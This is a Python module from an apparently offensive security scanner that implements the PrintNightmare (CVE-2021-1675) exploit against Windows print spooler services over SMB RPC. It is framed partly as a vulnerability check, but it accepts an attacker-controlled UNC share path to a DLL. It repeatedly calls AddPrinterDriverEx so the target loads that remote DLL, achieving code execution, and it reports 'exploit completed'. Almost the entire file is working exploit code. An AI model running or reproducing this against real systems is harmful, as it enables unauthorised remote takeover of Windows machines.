import sys
from ctypes import *
import socket
import struct
import logging

from utils.output import Output
from utils.db import DB
from utils.utils import gen_random_string, gen_bruteforce_creds
from server.vulnerability_callback import VulnCallback

import impacket
import pathlib
from impacket.dcerpc.v5 import rprn
from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5.dtypes import NULL
from impacket.structure import Structure

# source: https://github.com/cube0x0/CVE-2021-1675

class Module:
    name = 'PrintNightmare'
    description = 'Check PrintNightmare vulnerability (CVE-2021-1675) (argument: IP for check or \'\\\\IP\\SHARE\\path\\to\\dll.dll\' for exploit)'

    def run(self, target, args, creds, timeout):
        if len(args) != 1:
            Output.error({'target': 'smb://%s:%d' % (target['hostname'], target['port']), 'message': 'PrintNightmare module requires 1 arg: -m printnightmare <listener_ip>'})
            return
        else:
            listener_ip = args[0]

        domain = creds['domain'] if 'domain' in creds else None
        user = creds['username'] if 'username' in creds else None
        password = creds['password'] if 'password' in creds else None
        ntlm_hash = creds['hash'] if 'hash' in creds else ''
        do_kerberos = creds['kerberos'] if 'kerberos' in creds else False
        dc_ip = creds['dc_ip'] if 'dc_ip' in creds else None

        if user == None:
            Output.highlight({'target': 'smb://%s:%d' % (target['hostname'], target['port']), 'message': 'Printnightmare module works best with an account !'})


        check(target['hostname'], target['port'], listener_ip, domain, user, password, ntlm_hash, do_kerberos, dc_ip, timeout)

def check(ip, port, listener_ip, domain, username, password, ntlm_hash, do_kerberos, dc_ip, timeout):

    do_kerberos = False
    pipe = 'lsarpc'
    if len(ntlm_hash) != 0:
        lmhash, nthash = ntlm_hash.split(':')
    else:
        lmhash = ''
        nthash = ''

    #connect
    dce = connect(username, password, domain, lmhash, nthash, do_kerberos, dc_ip, ip, port)
    #handle = "\\\\{0}\x00".format(address)
    handle = NULL
    
    #find "C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_83aa9aebf5dffc96\\Amd64\\UNIDRV.DLL" path
    try:
        blob = getDriver(dce, handle)
        if blob == None:
            return

        pDriverPath = str(pathlib.PureWindowsPath(blob['DriverPathArray']).parent) + '\\UNIDRV.DLL'
        if not "FileRepository" in pDriverPath:
            #print("[-] pDriverPath {0}, expected :\\Windows\\System32\\DriverStore\\FileRepository\\.....".format(pDriverPath))
            #print("[-] Specify pDriverPath manually")
            return
    except Exception as e:
        #print('[-] Failed to enumerate remote pDriverPath')
        #print(str(e))
        return

    vuln_info = {
        'hostname': ip,
        'port': port,
        'service': 'smb',
        'url': 'smb://%s:%d' % (ip, port),
        'name': 'CVE-2021-1675 (PrintNightmare)',
        'description': 'Server smb://%s:%d is vulnerable to CVE-2021-1675 (PrintNightmare)' % (ip, port),
    }

    if "\\\\" in listener_ip:
        listener_share = listener_ip
    else:
        # Don't do this if listener_ip = share
        vuln_id = VulnCallback.new_vulnerability_check(vuln_info)

        listener_share = "\\\\%s\\vuln\\%s" % (listener_ip, vuln_id)

    if "\\\\" in listener_share:
        listener_share = listener_share.replace("\\\\","\\??\\UNC\\")

    #print("[+] pDriverPath Found {0}".format(pDriverPath))
    #print("[*] Executing {0}".format(options.share))

    #re-run if stage0/stageX fails
    for i in range(3):
        #print("[*] Try 1...")
        completed = exploit(dce, pDriverPath, listener_share)
        if completed:
            break

#https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/2825d22e-c5a5-47cd-a216-3e903fd6e030
class DRIVER_INFO_2_BLOB(Structure):
    structure = (
        ('cVersion','<L'),
        ('NameOffset', '<L'),
        ('EnvironmentOffset', '<L'),
        ('DriverPathOffset', '<L'),
        ('DataFileOffset', '<L'),
        ('ConfigFileOffset', '<L'),
    )

    def __init__(self, data = None):
        Structure.__init__(self, data = data)
    
    def fromString(self, data, offset=0):
        Structure.fromString(self, data)
        self['ConfigFileArray'] = self.rawData[self['ConfigFileOffset']+offset:self['DataFileOffset']+offset].decode('utf-16-le')
        self['DataFileArray'] = self.rawData[self['DataFileOffset']+offset:self['DriverPathOffset']+offset].decode('utf-16-le')
        self['DriverPathArray'] = self.rawData[self['DriverPathOffset']+offset:self['EnvironmentOffset']+offset].decode('utf-16-le')
        self['EnvironmentArray'] = self.rawData[self['EnvironmentOffset']+offset:self['NameOffset']+offset].decode('utf-16-le')
        #self['NameArray'] = self.rawData[self['NameOffset']+offset:len(self.rawData)].decode('utf-16-le')

class DRIVER_INFO_2_ARRAY(Structure):
    def __init__(self, data = None, pcReturned = None):
        Structure.__init__(self, data = data)
        self['drivers'] = list()
        remaining = data
        if data is not None:
            for i in range(pcReturned):
                attr = DRIVER_INFO_2_BLOB(remaining)
                self['drivers'].append(attr)
                remaining = remaining[len(attr):]

def connect(username, password, domain, lmhash, nthash, do_kerberos, dc_ip, address, port):
    binding = r'ncacn_np:{0}[\PIPE\spoolss]'.format(address)
    rpctransport = transport.DCERPCTransportFactory(binding)
    
    rpctransport.set_dport(port)
    rpctransport.setRemoteHost(address)
    
    if hasattr(rpctransport, 'set_credentials'):
        # This method exists only for selected protocol sequences.
        rpctransport.set_credentials(username, password, domain, lmhash, nthash)
    rpctransport.set_kerberos(do_kerberos, dc_ip)
    
    #print("[*] Connecting to {0}".format(binding))
    try:
        dce = rpctransport.get_dce_rpc()
        dce.connect()
        dce.bind(rprn.MSRPC_UUID_RPRN)
    except:
        #print("[-] Connection Failed")
        return None
    #print("[+] Bind OK")
    return dce


def getDriver(dce, handle=NULL):
    #get drivers
    resp = rprn.hRpcEnumPrinterDrivers(dce, pName=handle, pEnvironment="Windows x64\x00", Level=2)
    blobs = DRIVER_INFO_2_ARRAY(b''.join(resp['pDrivers']), resp['pcReturned'])
    for i in blobs['drivers']:
        if "filerepository" in i['DriverPathArray'].lower():
            return i
    
    #print("[-] Failed to find driver")
    return None

def exploit(dce, pDriverPath, share, handle=NULL):
    completed = False
    
    try:
        #build DRIVER_CONTAINER package
        container_info = rprn.DRIVER_CONTAINER()
        container_info['Level'] = 2
        container_info['DriverInfo']['tag'] = 2
        container_info['DriverInfo']['Level2']['cVersion']     = 3
        container_info['DriverInfo']['Level2']['pName']        = "1234\x00"
        container_info['DriverInfo']['Level2']['pEnvironment'] = "Windows x64\x00"
        container_info['DriverInfo']['Level2']['pDriverPath']  = pDriverPath + '\x00'
        container_info['DriverInfo']['Level2']['pDataFile']    = "{0}\x00".format(share)
        container_info['DriverInfo']['Level2']['pConfigFile']  = "C:\\Windows\\System32\\winhttp.dll\x00"
        
        flags = rprn.APD_COPY_ALL_FILES | 0x10 | 0x8000
        filename = share.split("\\")[-1]

        # During the check (not exploitation) a ERROR_PATH_NOT_FOUND is raised here
        Output.highlight("Printnightmare first step completed, check your SMB server")
        resp = rprn.hRpcAddPrinterDriverEx(dce, pName=handle, pDriverContainer=container_info, dwFileCopyFlags=flags)
        #print("[*] Stage0: {0}".format(resp['ErrorCode']))

        container_info['DriverInfo']['Level2']['pConfigFile']  = "C:\\Windows\\System32\\kernelbase.dll\x00"
        for i in range(1, 30):
            try:
                container_info['DriverInfo']['Level2']['pConfigFile'] = "C:\\Windows\\System32\\spool\\drivers\\x64\\3\\old\\{0}\\{1}\x00".format(i, filename)
                resp = rprn.hRpcAddPrinterDriverEx(dce, pName=handle, pDriverContainer=container_info, dwFileCopyFlags=flags)
                #print("[*] Stage{0}: {1}".format(i, resp['ErrorCode']))
                if (resp['ErrorCode'] == 0):
                    Output.highlight("Printnightmare exploit completed")
                    completed = True
                    break
            except Exception as e:
                #print(e)
                pass
    except impacket.dcerpc.v5.rprn.DCERPCSessionError:
        completed = True
        
    return completed
